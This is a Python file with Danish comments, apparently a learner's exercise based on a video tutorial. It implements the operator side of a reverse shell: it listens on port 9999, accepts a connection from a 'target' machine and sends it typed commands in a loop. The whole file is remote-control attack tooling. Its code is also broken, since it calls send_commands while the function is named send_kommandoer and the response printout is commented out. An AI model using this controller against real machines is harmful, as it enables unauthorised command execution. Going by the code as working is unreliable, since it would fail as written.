import socket 
import sys


#Guided af TheNewBoston
#https://www.youtube.com/watch?v=42pQmreBYuU

#For traening og forstaaelse!

#Dette er min server!
#Lav en socket connection (tillader to enheder at kommunikere med hinanden)

def socket_oprettelse():
	try:
		global host
		global port
		global sock
		host = ''
		port = 9999
		sock = socket.socket()
	except socket.error as error_msg:
		print('Din Socket blev ikke lavet korrekt!:' + str(error_msg))

# Method til at sammenkoble min socket til en port. 
# Vent paa en forbindelse fra target maskinen!

def socket_binding():
	try:
		global host
		global port
		global sock
		print('Forbindelse blev bundet sammen med port: ' + str(port))
		sock.bind((host,port))
		#alt informtion er nu bundet sammen
		#vi er nu klar til at lytte efter en forbindelse!
		sock.listen(5)#<--- bestemmer hvor mange gange den tillader en daarlig 
							#forbindelse foer den naegter en ny forbindelse
	except socket.error as error_msg:
		print('Socket blev ikke bundet korrekt' + str(error_msg) + '\n' + 'Forsoeger igen...')	
		socket_binding()

# opret nu en forbindelse til target (Socket SKAL lytte efter dem)

def socket_acceptering():
	conn, address = sock.accept()#<--- tillader en ny forbindelse!
	#conn = selve forbindelsen (samtalen)
	#address = den som er forbundet
	print('Forbindelse er blevet etableret | ' + 'IP' + address[0] + '| port ' + str(address[1]))
	send_commands(conn) #<---- naar target er forbundet vil den lytte,
	 					#efter en kommando fra serverens side
	conn.close()

#Naar der er blevet accepteren en forbindelse saa er vi klar til at sende kommandoer til vores target.

#metode til at sende kommandoer.
def send_kommandoer(conn):
	#vi vil gerne kunne blive ved med at sende kommandoer saa
	#vi laver et while true loop.
	while True:
		cmd = input()#<---- det som vi skriver til vores target!
		#cmd er en string. En kommando i en terminal er altid bytes som datatype.
		if cmd == 'quit':
			conn.close()#<---- luk forbindelsen
			sock.close()#<--- luk for socket
			sys.exit()#<---- system kommando for at afslutte
			#konvater bytes (fra cmd) til en string

		#Hvis det skal vises for brugeren saa er det string
		#Naar den skal sendes igennem netvearket saa skal det vaere bytes	
		if len(str.encode(cmd)) > 0:#<--- Hvis laengden af vores string er stoerre end 0

				#encode til en string
			conn.send(str.encode(cmd))#<--- vi sender kommandoen til target som en string
			client_response = str(conn.recv(1024), 'utf-8')		
										#recv = recieve | 1024 = buffer size | 
										#utf-8 = tegnkodning for en normal string

			#print(client_response, end="")#<----- end='' vil fejle hvis vi laver det i python 2, men ikke i python 3

#app start metode - hvad skal programmet goere naar det starter?
def main():
	socket_oprettelse()
	socket_binding()
	socket_acceptering()
	#vi behover ikke "send_commands" metoden her, fordi naar vi acceptere forbindelsen (socket_accept)
	#kalder den allerede send_commands metoden.	
main()		